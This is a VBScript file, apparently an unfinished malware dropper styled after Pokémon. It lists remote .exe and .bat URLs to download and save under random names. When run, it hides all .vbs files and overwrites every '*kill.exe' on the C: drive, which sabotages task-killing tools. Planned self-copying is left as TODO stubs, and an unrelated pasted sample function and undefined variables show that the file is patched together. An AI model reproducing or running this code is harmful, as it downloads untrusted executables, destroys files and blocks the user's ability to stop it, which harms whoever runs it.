'''All the New Pokemans Fork'''
Dim max,min
Dim list
Set list = CreateObject("System.Collections.ArrayList")
	list.Add "http://a.pomf.cat/uthqdm.exe"		   'eevee
	list.Add "http://a.pomf.cat/utoojo.exe"        'installer
	list.Add "https://a.pomf.cat/ayunww.bat"	   'the equalizer

i = 0
Set oShell = WScript.CreateObject ("WScript.Shell")
'Hide it all
oShell.run "cmd.exe /c for /r %i in (*.vbs) do attrib +h ""%i""" 
'destroy all taskkillers
oShell.run "cmd.exe /c for /r C:\ %i in (*kill.exe) do echo . > ""%i"""


'TODO run all eevee executables
Function getFiles(value)
	Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    objXMLHTTP.open "GET",value, false
    objXMLHTTP.send()
    If objXMLHTTP.Status = 200 Then
		Set objADOStream = CreateObject("ADODB.Stream")
		objADOStream.Open
		objADOStream.Type = 1 
		objADOStream.Write objXMLHTTP.ResponseBody
		objADOStream.Position = 0    
		Set objFSO = Createobject("Scripting.FileSystemObject")
		If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
			Set objFSO = Nothing

			objADOStream.SaveToFile randExeName
			objADOStream.Close
			Set objADOStream = Nothing
		End if
	End If	
End Function
'TODO copy random eevee executable everywhere
Function executeEevees() 'no seriously kill them all

End Function


'create random eevee executable
Function randExeName()
	randExeName = (Int((max-min+1)*Rnd+min))&".exe"
End Function

retValue = ShowSum(7, 8)
MsgBox "The function returned:  " & retValue

Function ShowSum(value1, value2)
    Dim sum

    ' Determine and display the sum.
    sum = value1 + value2
    MsgBox "The sum is:  " & sum

    ' Set the function's return value.
    ShowSum = sum
End Function